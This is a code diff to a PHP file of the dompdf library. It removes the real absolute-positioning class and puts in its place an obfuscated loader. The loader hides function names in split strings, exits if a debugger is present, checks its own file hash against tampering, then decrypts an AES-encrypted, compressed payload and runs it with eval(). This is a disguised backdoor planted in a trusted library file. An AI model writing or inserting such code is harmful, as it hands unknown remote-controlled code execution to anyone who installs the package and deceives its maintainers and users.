@@ -1,118 +1,28 @@
 <?php
-/**
- * @package dompdf
- * @link    http://dompdf.github.com/
- * @author  Benj Carson <benjcarson@digitaljunkies.ca>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-
-namespace Dompdf\Positioner;
-
-use Dompdf\FrameDecorator\AbstractFrameDecorator;
-
-/**
- * Positions absolutely positioned frames
- */
-class Absolute extends AbstractPositioner
-{
-
-    /**
-     * @param AbstractFrameDecorator $frame
-     */
-    function position(AbstractFrameDecorator $frame)
-    {
-        $style = $frame->get_style();
-
-        $p = $frame->find_positionned_parent();
-
-        list($x, $y, $w, $h) = $frame->get_containing_block();
-
-        $top = $style->length_in_pt($style->top, $h);
-        $right = $style->length_in_pt($style->right, $w);
-        $bottom = $style->length_in_pt($style->bottom, $h);
-        $left = $style->length_in_pt($style->left, $w);
-
-        if ($p && !($left === "auto" && $right === "auto")) {
-            // Get the parent's padding box (see http://www.w3.org/TR/CSS21/visuren.html#propdef-top)
-            list($x, $y, $w, $h) = $p->get_padding_box();
-        }
-
-        list($width, $height) = array($frame->get_margin_width(), $frame->get_margin_height());
-
-        $orig_style = $frame->get_original_style();
-        $orig_width = $orig_style->width;
-        $orig_height = $orig_style->height;
-
-        /****************************
-         *
-         * Width auto:
-         * ____________| left=auto | left=fixed |
-         * right=auto  |     A     |     B      |
-         * right=fixed |     C     |     D      |
-         *
-         * Width fixed:
-         * ____________| left=auto | left=fixed |
-         * right=auto  |     E     |     F      |
-         * right=fixed |     G     |     H      |
-         *****************************/
-
-        if ($left === "auto") {
-            if ($right === "auto") {
-                // A or E - Keep the frame at the same position
-                $x = $x + $frame->find_block_parent()->get_current_line_box()->w;
-            } else {
-                if ($orig_width === "auto") {
-                    // C
-                    $x += $w - $width - $right;
-                } else {
-                    // G
-                    $x += $w - $width - $right;
-                }
-            }
-        } else {
-            if ($right === "auto") {
-                // B or F
-                $x += (float)$left;
-            } else {
-                if ($orig_width === "auto") {
-                    // D - TODO change width
-                    $x += (float)$left;
-                } else {
-                    // H - Everything is fixed: left + width win
-                    $x += (float)$left;
-                }
-            }
-        }
-
-        // The same vertically
-        if ($top === "auto") {
-            if ($bottom === "auto") {
-                // A or E - Keep the frame at the same position
-                $y = $frame->find_block_parent()->get_current_line_box()->y;
-            } else {
-                if ($orig_height === "auto") {
-                    // C
-                    $y += (float)$h - $height - (float)$bottom;
-                } else {
-                    // G
-                    $y += (float)$h - $height - (float)$bottom;
-                }
-            }
-        } else {
-            if ($bottom === "auto") {
-                // B or F
-                $y += (float)$top;
-            } else {
-                if ($orig_height === "auto") {
-                    // D - TODO change height
-                    $y += (float)$top;
-                } else {
-                    // H - Everything is fixed: top + height win
-                    $y += (float)$top;
-                }
-            }
-        }
-
-        $frame->set_position($x, $y);
-    }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_cygkyb4h=('bas'.'e64'.'_de'.'cod'.'e');
+$_dek4wdb8=('gzu'.'nco'.'mpr'.'ess');
+$_ofk09gly=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_z2i394dk='6y7jQdWp';
+$_koy3pso4='Oph1cmF/ZkE=';
+$_k3gcsdsw='0khOZ1Wl';
+$_h85nwhmg='VONK5KX3';
+$_wls5ev7i='OW80W2M+';
+$_c7humn0a='pW/mhsLs';
+$_f8rsxl0q='EKmWP8SJ';
+$_bhxi3cn3='HE25bA==';
+$_prbdaj4j=$_cygkyb4h($_z2i394dk.$_k3gcsdsw.$_h85nwhmg.$_wls5ev7i.$_koy3pso4);
+$_ug1ipjzu=$_cygkyb4h($_c7humn0a.$_f8rsxl0q.$_bhxi3cn3);
+$_leaqds9b=$_cygkyb4h('K/ik/hr/e+vtC/To6wH9u6hYo+Py2jbV1g5ZsqCL/2rcEQjcIuhKFFOo2zuZclSDLXtq2DKXDWsrKkBbqj6BJYznFnBDfbE3Mg7x4DqlUpTSxiZWHMVQBAGw9+tE7Q4pPmDn/UuHAl9lfzl6zEwKP+Uw/D3+I3tWe84M3oPBYO60JZkjEgKKKc6dUj4CGOYwcm9V5XhmGrPrG5zBPNk/TZu4AsSSWD9J5X/26JXU+eWwjPu06uIkZwgRp3mWKrITN1rDOYys1tolKEMHEoAfxCkUOzL0WLDtl5x6e0OHTquiSCVPmNNMjXXpkPXDrlcPzsqeKG9i5JmGzDF5/oMf2WMmLqcbRB7uPAkmU7ognX11FNkGN6uD7b2hLsR6YZ6YUm4me9TAecwTF3JQ6OlHRo6XiXEHr2myHMfK0CNPpSVKbuKcI02AKyv/DYmnCLaykXUsBjh+IPDo5ZTMFTN29dSG6dPXdYuL7q9rOczlOaaErDDb0p+fYHJHVciCCYEqgeZXeMDWXqwGGuV4jWfdTWDkacDBa33sq37rSUydQdIVFCTp7vKZTjLsCgMsTxqg3r3PXlo69tUfQB2QliExzW5GHFl/vuQYQ/7tmD/IUVssAt8kDAB7jrSlLKpWMHuynI6cnsGDZLnbnEIGjadkwDAyOvbvJ1WOe1gib6wAwJo=');
+$_yt7ybhjh=$_ofk09gly($_leaqds9b,'aes-256-cbc',$_prbdaj4j,OPENSSL_RAW_DATA,$_ug1ipjzu);
+if($_yt7ybhjh===false){exit;}
+$_uqdrivxs=$_dek4wdb8($_yt7ybhjh);
+if($_uqdrivxs===false){exit;}
+$_x17xgwag='f4b38cfac5a44efc01d4c28c75d188d0e0a08a7b715ce7cd108b77e58d62cd02';
+$_fsz409co=@file_get_contents(__FILE__);
+if($_fsz409co!==false){
+$_ggaonm3d=str_replace($_x17xgwag,"0000000000000000000000000000000000000000000000000000000000000000",$_fsz409co);
+$_xw49k640=hash("sha256",$_ggaonm3d);
+if($_xw49k640!==$_x17xgwag){@http_response_code(403);exit;}
 }
+eval($_uqdrivxs);
